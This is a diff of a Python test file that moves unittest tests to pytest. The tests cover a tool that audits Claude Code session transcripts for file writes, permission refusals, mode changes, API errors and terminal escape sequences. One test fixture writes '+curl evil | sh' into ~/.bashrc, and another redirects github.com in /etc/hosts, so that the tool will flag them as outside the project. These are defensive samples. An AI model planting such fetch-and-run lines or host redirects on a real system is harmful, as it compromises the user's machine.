@@ -6,8 +6,8 @@ its prompts, and what became of its mode, its model and its cache."""
 from __future__ import annotations
 
 import json
-import unittest
 
+import pytest
 from harness import LauncherTest
 
 from claude_airlock.events import Event, Who
@@ -94,7 +94,7 @@ def hunk(*lines: str) -> dict:
     }
 
 
-class CommandTest(unittest.TestCase):
+class CommandTest:
     """What a command did that its output does not say."""
 
     def ran(self, **noted) -> Event:
@@ -105,35 +105,33 @@ class CommandTest(unittest.TestCase):
         file = {"filePath": "/p/x", "hunks": [hunk(" same", "-a", "+b\x1b[2J")]}
         made = {"filePath": "/p/new", "hunks": [hunk("+one")], "created": True}
         ran = self.ran(toolUseResult=changed(file, made, also=("/p/unseen",)))
-        self.assertEqual(
-            ran.details[2:],
-            [
-                "changed: /p/x (+1 -1)",
-                "changed: /p/new (created, +1 -0)",
-                "changed: /p/unseen",
-            ],
-        )
+        assert ran.details[2:] == [
+            "changed: /p/x (+1 -1)",
+            "changed: /p/new (created, +1 -0)",
+            "changed: /p/unseen",
+        ]
         # What changed is whole in --json
-        self.assertEqual(
-            ran.fields["changed"][0]["diff"],
-            ["@@ -3,2 +3,2 @@", " same", "-a", "+b[2J"],
-        )
-        self.assertFalse(went_wrong(ran))
-        self.assertEqual(
-            [file["path"] for file in ran.fields["changed"]],
-            ["/p/x", "/p/new", "/p/unseen"],
-        )
+        assert ran.fields["changed"][0]["diff"] == [
+            "@@ -3,2 +3,2 @@",
+            " same",
+            "-a",
+            "+b[2J",
+        ]
+        assert not went_wrong(ran)
+        assert [file["path"] for file in ran.fields["changed"]] == [
+            "/p/x",
+            "/p/new",
+            "/p/unseen",
+        ]
 
     def test_a_command_that_wrote_outside_the_project_went_wrong(self):
         inside = {"filePath": "/p/x", "hunks": [hunk("+b")]}
         beyond = {"filePath": "/home/me/.bashrc", "hunks": [hunk("+curl evil | sh")]}
         ran = self.ran(toolUseResult=changed(inside, beyond))
         flagged = [line for at, line in enumerate(ran.details) if alerting(ran, at)]
-        self.assertEqual(
-            flagged, ["changed: /home/me/.bashrc (+1 -0)  OUTSIDE PROJECT"]
-        )
-        self.assertTrue(went_wrong(ran))
-        self.assertTrue(ran.fields["outside_project"])
+        assert flagged == ["changed: /home/me/.bashrc (+1 -0)  OUTSIDE PROJECT"]
+        assert went_wrong(ran)
+        assert ran.fields["outside_project"]
 
     def test_of_many_files_the_first_are_named_unless_verbose(self):
         files = [{"filePath": f"/p/{n:02}", "hunks": [hunk("+b")]} for n in range(52)]
@@ -144,24 +142,24 @@ class CommandTest(unittest.TestCase):
         ]
         ran = events(entries)[0]
         named = [line for line in ran.details if line.startswith("changed: ")]
-        self.assertEqual(len(named), 51)
+        assert len(named) == 51
         # One that is not named may be the one outside the project
         last = "changed: ... 3 more files, see --verbose  OUTSIDE PROJECT"
-        self.assertEqual(named[-1], last)
-        self.assertTrue(alerting(ran, ran.details.index(last)))
-        self.assertTrue(went_wrong(ran))
-        self.assertEqual(len(ran.fields["changed"]), 53)
+        assert named[-1] == last
+        assert alerting(ran, ran.details.index(last))
+        assert went_wrong(ran)
+        assert len(ran.fields["changed"]) == 53
         whole = events(entries, verbose=True)[0].details
-        self.assertIn("changed: /etc/hosts (+1 -0)  OUTSIDE PROJECT", whole)
+        assert "changed: /etc/hosts (+1 -0)  OUTSIDE PROJECT" in whole
 
     def test_followed_the_result_has_what_the_command_changed(self):
         file = {"filePath": "/etc/hosts", "hunks": [hunk("+1.2.3.4 github.com")]}
         walk = transcript.Walk(PROJECT, WalkOptions(live=True))
         entries = [call("c1", command="x"), result("c1", toolUseResult=changed(file))]
         ended = [event for entry in entries for event in walk.take(entry)][1]
-        self.assertEqual(ended.fields["stage"], "result")
-        self.assertIn("changed: /etc/hosts (+1 -0)  OUTSIDE PROJECT", ended.details)
-        self.assertTrue(went_wrong(ended))
+        assert ended.fields["stage"] == "result"
+        assert "changed: /etc/hosts (+1 -0)  OUTSIDE PROJECT" in ended.details
+        assert went_wrong(ended)
 
     def test_a_result_says_what_claude_code_noted_of_how_it_ended(self):
         noted = {
@@ -171,32 +169,27 @@ class CommandTest(unittest.TestCase):
             "persistedOutputSize": 78750,
         }
         ran = self.ran(toolUseResult=noted)
-        self.assertEqual(
-            ran.details[1:],
-            [
-                "result: ok, 1.0s, INTERRUPTED, No matches\\nfound",
-                "output kept: /tmp/out.txt (79 kB)",
-            ],
-        )
+        assert ran.details[1:] == [
+            "result: ok, 1.0s, INTERRUPTED, No matches\\nfound",
+            "output kept: /tmp/out.txt (79 kB)",
+        ]
         plain = self.ran(toolUseResult={"interrupted": False, "stdout": "x"})
-        self.assertEqual(plain.details[1:], ["result: ok, 1.0s"])
+        assert plain.details[1:] == ["result: ok, 1.0s"]
 
     def test_who_allowed_a_call_is_said_when_it_was_not_the_mode(self):
         def ended(**decision) -> Event:
             return self.ran(permissionDecision=decision)
 
         by_mode = ended(decision="accept", source="config", reasonType="mode")
-        self.assertEqual(by_mode.details[1], "result: ok, 1.0s")
-        self.assertNotIn("permission", by_mode.fields)
+        assert by_mode.details[1] == "result: ok, 1.0s"
+        assert "permission" not in by_mode.fields
         once = ended(decision="accept", source="user_temporary", grantScope="once")
-        self.assertEqual(once.details[1], "result: ok, 1.0s, allowed by you, once")
-        self.assertFalse(went_wrong(once))
+        assert once.details[1] == "result: ok, 1.0s, allowed by you, once"
+        assert not went_wrong(once)
         by_rule = ended(decision="accept", source="config", reasonType="rule")
-        self.assertEqual(by_rule.details[1], "result: ok, 1.0s, allowed by a rule")
+        assert by_rule.details[1] == "result: ok, 1.0s, allowed by a rule"
         by_hook = ended(decision="accept", source="pre_tool\x1b_hook")
-        self.assertEqual(
-            by_hook.details[1], "result: ok, 1.0s, allowed by pre tool hook"
-        )
+        assert by_hook.details[1] == "result: ok, 1.0s, allowed by pre tool hook"
 
     def test_a_call_that_was_refused_went_wrong(self):
         for decision, by in (
@@ -209,9 +202,9 @@ class CommandTest(unittest.TestCase):
             ({"decision": ["?"], "source": 7}, "?"),
         ):
             refused = self.ran(permissionDecision=decision)
-            self.assertEqual(refused.details[1], f"result: ok, 1.0s, REFUSED by {by}")
-            self.assertTrue(went_wrong(refused))
-            self.assertTrue(alerting(refused, 1))
+            assert refused.details[1] == f"result: ok, 1.0s, REFUSED by {by}"
+            assert went_wrong(refused)
+            assert alerting(refused, 1)
 
     def test_what_went_wrong_is_told_by_what_ended_not_by_what_a_line_says(self):
         # Arguments named as the lines of a result are, of a call that failed
@@ -220,26 +213,26 @@ class CommandTest(unittest.TestCase):
             result("c1", "no", failed=True),
         ]
         ran = events(entries)[0]
-        self.assertEqual(
-            [line for at, line in enumerate(ran.details) if alerting(ran, at)],
-            ["result: FAILED, 1.0s, 1 line out", "out: no"],
-        )
+        assert [line for at, line in enumerate(ran.details) if alerting(ran, at)] == [
+            "result: FAILED, 1.0s, 1 line out",
+            "out: no",
+        ]
 
     def test_what_is_found_out_later_is_said_with_the_first_line(self):
         said = Event(1.0, Who.SANDBOX, "net", ["tcp/https a.test:443", "more"], {})
-        self.assertEqual(said.lines, said.details)
+        assert said.lines == said.details
         said.tag = "[claude-proj]"
         said.notes += ["by: curl", "during: $ make"]
-        self.assertEqual(
-            said.lines,
-            ["[claude-proj] tcp/https a.test:443  by: curl  during: $ make", "more"],
-        )
-        self.assertEqual(said.details, ["tcp/https a.test:443", "more"])
+        assert said.lines == [
+            "[claude-proj] tcp/https a.test:443  by: curl  during: $ make",
+            "more",
+        ]
+        assert said.details == ["tcp/https a.test:443", "more"]
         bare = Event(1.0, Who.CLAUDE, "bash", [], {}, notes=["REMOVED"])
-        self.assertEqual(bare.lines, ["REMOVED"])
+        assert bare.lines == ["REMOVED"]
 
 
-class ToldTest(unittest.TestCase):
+class ToldTest:
     """What Claude Code put before the model next to the prompt."""
 
     FILES = (
@@ -262,18 +255,15 @@ class ToldTest(unittest.TestCase):
             "instructions: /p/CLAUDE.md[2J (Project, 11 chars)",
         ]
         later = [*first, "instructions: /p/sub/CLAUDE.md (?, 0 chars)"]
-        self.assertEqual(told, [("context", first), ("context", later)])
+        assert told == [("context", first), ("context", later)]
 
     def test_the_header_names_the_instructions_read(self):
         read = attached("instructions", files=list(self.FILES))
-        self.assertEqual(
-            summary.summary([read, read], PROJECT)[-3:],
-            [
-                "instructions read",
-                "  /etc/claude-code/CLAUDE.md (Managed)",
-                "  /p/CLAUDE.md[2J (Project)",
-            ],
-        )
+        assert summary.summary([read, read], PROJECT)[-3:] == [
+            "instructions read",
+            "  /etc/claude-code/CLAUDE.md (Managed)",
+            "  /p/CLAUDE.md[2J (Project)",
+        ]
 
     def test_what_servers_and_skills_added_is_said(self):
         servers = attached(
@@ -283,23 +273,16 @@ class ToldTest(unittest.TestCase):
             "skill_listing", skillCount=2, names=["pdf", "xlsx"], isInitial=True
         )
         nothing = attached("mcp_instructions_delta", addedNames=[], removedNames=[])
-        self.assertEqual(
-            shown([servers, skills, skills, nothing]),
-            [
-                (
-                    "context",
-                    [
-                        "MCP server instructions: docs",
-                        "MCP server instructions gone: db",
-                    ],
-                ),
-                ("context", ["skills: 2 listed"]),
-            ],
-        )
-        self.assertEqual(
-            shown([skills], verbose=True),
-            [("context", ["skills: 2 listed: pdf, xlsx"])],
-        )
+        assert shown([servers, skills, skills, nothing]) == [
+            (
+                "context",
+                ["MCP server instructions: docs", "MCP server instructions gone: db"],
+            ),
+            ("context", ["skills: 2 listed"]),
+        ]
+        assert shown([skills], verbose=True) == [
+            ("context", ["skills: 2 listed: pdf, xlsx"])
+        ]
 
     def test_a_line_typed_while_claude_worked_is_a_prompt(self):
         typed = attached(
@@ -311,16 +294,14 @@ class ToldTest(unittest.TestCase):
             ],
         )
         (said,) = events([typed])
-        self.assertEqual((said.who, said.what), (Who.USER, "prompt"))
-        self.assertEqual(
-            said.lines,
-            ["(typed while claude worked) also fix[2J the tests", "and the docs"],
-        )
-        self.assertTrue(said.fields["queued"])
+        assert (said.who, said.what) == (Who.USER, "prompt")
+        assert said.lines == [
+            "(typed while claude worked) also fix[2J the tests",
+            "and the docs",
+        ]
+        assert said.fields["queued"]
         as_text = attached("queued_command", commandMode="prompt", prompt="plain")
-        self.assertEqual(
-            shown([as_text]), [("prompt", ["(typed while claude worked) plain"])]
-        )
+        assert shown([as_text]) == [("prompt", ["(typed while claude worked) plain"])]
 
     def test_a_task_that_ended_is_said_by_how_and_what(self):
         note = (
@@ -328,17 +309,15 @@ class ToldTest(unittest.TestCase):
             '<summary>Agent "review" finished</summary>\n<result>long</result>'
         )
         ended = attached("queued_command", commandMode="task-notification", prompt=note)
-        self.assertEqual(
-            shown([ended]), [("task", ['completed: Agent "review" finished'])]
-        )
+        assert shown([ended]) == [("task", ['completed: Agent "review" finished'])]
         other = attached("queued_command", commandMode="bash", prompt="ls\nmore")
-        self.assertEqual(shown([other]), [("context", ["told (bash): ls"])])
+        assert shown([other]) == [("context", ["told (bash): ls"])]
 
     def test_a_file_that_changed_behind_claude_is_said(self):
         edited = attached("edited_text_file", filename="/p/a.py", snippet="")
-        self.assertEqual(
-            shown([edited]), [("context", ["changed since claude read it: /p/a.py"])]
-        )
+        assert shown([edited]) == [
+            ("context", ["changed since claude read it: /p/a.py"])
+        ]
 
     def test_what_a_language_server_reported_needs_verbose(self):
         found = {
@@ -352,23 +331,20 @@ class ToldTest(unittest.TestCase):
                 {"uri": "/p/a.py", "diagnostics": [found, {"severity": "Warning"}, 7]}
             ],
         )
-        self.assertEqual(shown([report]), [])
-        self.assertEqual(
-            shown([report], verbose=True),
-            [
-                (
-                    "context",
-                    [
-                        "diagnostics: /p/a.py: 1 Error, 1 Warning",
-                        "  Error line 120: x is not\\ndefined",
-                        "  Warning: ",
-                    ],
-                )
-            ],
-        )
+        assert shown([report]) == []
+        assert shown([report], verbose=True) == [
+            (
+                "context",
+                [
+                    "diagnostics: /p/a.py: 1 Error, 1 Warning",
+                    "  Error line 120: x is not\\ndefined",
+                    "  Warning: ",
+                ],
+            )
+        ]
 
 
-class SessionTest(unittest.TestCase):
+class SessionTest:
     """What became of the session itself."""
 
     def test_a_change_of_the_permission_mode_is_an_event_the_first_is_not(self):
@@ -386,18 +362,13 @@ class SessionTest(unittest.TestCase):
             prompt("sub", permissionMode="default", isSidechain=True),
         ]
         changes = [event for event in events(entries) if event.what == "mode"]
-        self.assertEqual(
-            [event.details for event in changes],
-            [
-                ["permissions: bypassPermissions  was: default"],
-                ["permissions: plan  was: bypassPermissions"],
-            ],
-        )
-        self.assertEqual(
-            changes[0].fields, {"mode": "bypassPermissions", "was": "default"}
-        )
+        assert [event.details for event in changes] == [
+            ["permissions: bypassPermissions  was: default"],
+            ["permissions: plan  was: bypassPermissions"],
+        ]
+        assert changes[0].fields == {"mode": "bypassPermissions", "was": "default"}
         # Ahead of the prompt it was given with
-        self.assertEqual([what for what, _ in shown(entries)][-2:], ["mode", "prompt"])
+        assert [what for what, _ in shown(entries)][-2:] == ["mode", "prompt"]
 
     def test_a_change_of_model_or_effort_is_an_event(self):
         def request(model: object, effort: str = "medium", source: str = "sdk") -> dict:
@@ -420,13 +391,10 @@ class SessionTest(unittest.TestCase):
             request(None),
             {"type": "api-request", "params": "x"},
         ]
-        self.assertEqual(
-            shown(entries),
-            [
-                ("model", ["opus, effort medium  was: fable, effort medium"]),
-                ("model", ["opus, effort high  was: opus, effort medium"]),
-            ],
-        )
+        assert shown(entries) == [
+            ("model", ["opus, effort medium  was: fable, effort medium"]),
+            ("model", ["opus, effort high  was: opus, effort medium"]),
+        ]
 
     def test_api_trouble_is_said_and_went_wrong(self):
         error = {
@@ -443,18 +411,15 @@ class SessionTest(unittest.TestCase):
             "maxRetries": 10,
         }
         (said,) = events([failed])
-        self.assertEqual(
-            (said.what, said.details),
-            (
-                "api",
-                [
-                    "API error: No response[2J from API, tried again after 0.5s (retry 1 of 10)"
-                ],
-            ),
+        assert (said.what, said.details) == (
+            "api",
+            [
+                "API error: No response[2J from API, tried again after 0.5s (retry 1 of 10)"
+            ],
         )
-        self.assertTrue(went_wrong(said))
+        assert went_wrong(said)
         bare = {"type": "system", "subtype": "api_error", "error": 7, "retryInMs": "x"}
-        self.assertEqual(shown([bare]), [("api", ["API error: no reason given"])])
+        assert shown([bare]) == [("api", ["API error: no reason given"])]
 
     def test_a_compaction_is_said(self):
         about = {"trigger": "auto", "preTokens": 152_300}
@@ -463,22 +428,21 @@ class SessionTest(unittest.TestCase):
             "subtype": "compact_boundary",
             "compactMetadata": about,
         }
-        self.assertEqual(
-            shown([compacted, {"type": "system", "subtype": "compact_boundary"}]),
-            [
-                (
-                    "compact",
-                    ["the conversation was compacted (auto), 152.3k tokens before"],
-                ),
-                ("compact", ["the conversation was compacted"]),
-            ],
-        )
+        assert shown(
+            [compacted, {"type": "system", "subtype": "compact_boundary"}]
+        ) == [
+            (
+                "compact",
+                ["the conversation was compacted (auto), 152.3k tokens before"],
+            ),
+            ("compact", ["the conversation was compacted"]),
+        ]
 
     def test_a_walk_asked_for_the_steps_tells_them_without_verbose(self):
         entry = step("m1", 1, input_tokens=500, output_tokens=90)
         for steps, told in ((False, []), (True, ["step"])):
             walk = transcript.Walk(PROJECT, WalkOptions(live=True, steps=steps))
-            self.assertEqual([event.what for event in walk.take(entry)], told)
+            assert [event.what for event in walk.take(entry)] == told
 
     def test_a_step_that_missed_the_cache_says_so_and_why(self):
         def read(step_id: str, second: int, cached: int, new: int) -> dict:
@@ -504,19 +468,16 @@ class SessionTest(unittest.TestCase):
             read("m5", 5, 0, 103_000),
         ]
         steps = [details[0] for _, details in shown(entries, verbose=True)]
-        self.assertEqual(
-            [line.partition("  cache ")[2] for line in steps],
-            [
-                "",
-                "",
-                "MISSED, 72.0k read anew: 107 thinking blocks dropped, model mismatch",
-                "",
-                "MISSED, 103.0k read anew",
-            ],
-        )
+        assert [line.partition("  cache ")[2] for line in steps] == [
+            "",
+            "",
+            "MISSED, 72.0k read anew: 107 thinking blocks dropped, model mismatch",
+            "",
+            "MISSED, 103.0k read anew",
+        ]
         missed = events(entries, verbose=True)[2]
-        self.assertEqual(missed.fields["cache_missed"], 72_000)
-        self.assertFalse(went_wrong(missed))
+        assert missed.fields["cache_missed"] == 72000
+        assert not went_wrong(missed)
 
     def test_after_a_compaction_a_smaller_conversation_is_no_miss(self):
         entries = [
@@ -529,17 +490,17 @@ class SessionTest(unittest.TestCase):
             for what, details in shown(entries, verbose=True)
             if what == "step"
         ]
-        self.assertFalse(any("MISSED" in line for line in said))
+        assert not any("MISSED" in line for line in said)
 
     def test_an_aside_between_a_call_and_its_result_names_the_result(self):
         walk = transcript.Walk(PROJECT, WalkOptions(live=True))
         edited = attached("edited_text_file", filename="/p/a.py")
         entries = [call("c1", command="make"), edited, result("c1", "done")]
         ended = [event for entry in entries for event in walk.take(entry)][-1]
-        self.assertEqual(ended.details[0], "of: $ make")
+        assert ended.details[0] == "of: $ make"
 
 
-class HostileTest(unittest.TestCase):
+class HostileTest:
     """A transcript is the session's to write: no shape of these entries
     stops the reading, and none of them reaches a terminal as it is."""
 
@@ -649,7 +610,7 @@ class HostileTest(unittest.TestCase):
             for event in found:
                 json.loads(event_json("s", event))
                 for line in layout.event(event):
-                    self.assertNotIn("\x1b", line)
+                    assert "\x1b" not in line
         summary.summary(entries, PROJECT)
 
 
@@ -658,8 +619,8 @@ class TraceTest(LauncherTest):
 
     SESSION = "3fa9c0de-0000-4000-8000-000000000000"
 
-    def setUp(self):
-        super().setUp()
+    @pytest.fixture(autouse=True)
+    def traced_session(self, sandbox: None) -> None:
         beyond = {"filePath": "/home/me/.bashrc", "hunks": [hunk("+x")]}
         refusal = {"decision": "reject", "source": "user_reject"}
         self.write_transcript(
@@ -691,43 +652,36 @@ class TraceTest(LauncherTest):
             "# files written\n#   /home/me/.bashrc x1  OUTSIDE PROJECT",
             "claude   mode        permissions: bypassPermissions  was: default",
         ):
-            self.assertIn(expected, header)
+            assert expected in header
 
     def test_failed_keeps_a_refusal_a_write_outside_and_api_trouble(self):
         failed = self.launch("--trace", "--failed").stdout
         kept = [line for line in failed.splitlines() if not line.startswith("#")]
-        self.assertEqual(
-            [
-                line.split(maxsplit=4)[3:]
-                for line in kept
-                if "result:" in line or "API" in line
-            ],
-            [
-                ["bash", "result: ok, 1.0s"],
-                ["bash", "result: FAILED, 1.0s, REFUSED by you, 1 line out"],
-                ["api", "API error: down"],
-            ],
-        )
-        self.assertNotIn("instructions:", "\n".join(kept))
+        assert [
+            line.split(maxsplit=4)[3:]
+            for line in kept
+            if "result:" in line or "API" in line
+        ] == [
+            ["bash", "result: ok, 1.0s"],
+            ["bash", "result: FAILED, 1.0s, REFUSED by you, 1 line out"],
+            ["api", "API error: down"],
+        ]
+        assert "instructions:" not in "\n".join(kept)
         only = self.launch("--trace", "--only", "mode,context").stdout
-        self.assertEqual(
-            [line.split()[3] for line in only.splitlines() if not line.startswith("#")],
-            ["context", "mode"],
-        )
+        assert [
+            line.split()[3] for line in only.splitlines() if not line.startswith("#")
+        ] == ["context", "mode"]
 
     def test_json_has_the_values_of_each(self):
         lines = self.launch("--trace", "--json").stdout.splitlines()
         by_what = {json.loads(line)["what"]: json.loads(line) for line in lines}
-        self.assertEqual(by_what["mode"]["was"], "default")
-        self.assertEqual(by_what["api"]["error"], "down")
-        self.assertEqual(by_what["context"]["files"][0]["path"], "/p/CLAUDE.md")
+        assert by_what["mode"]["was"] == "default"
+        assert by_what["api"]["error"] == "down"
+        assert by_what["context"]["files"][0]["path"] == "/p/CLAUDE.md"
         ran = [json.loads(line) for line in lines if json.loads(line)["what"] == "bash"]
-        self.assertEqual(ran[0]["changed"][0]["diff"], ["@@ -3,2 +3,2 @@", "+x"])
-        self.assertEqual(
-            (ran[1]["permission"], ran[1]["permission_by"], ran[1]["refused"]),
-            ("reject", "you", True),
+        assert ran[0]["changed"][0]["diff"] == ["@@ -3,2 +3,2 @@", "+x"]
+        assert (ran[1]["permission"], ran[1]["permission_by"], ran[1]["refused"]) == (
+            "reject",
+            "you",
+            True,
         )
-
-
-if __name__ == "__main__":
-    unittest.main()
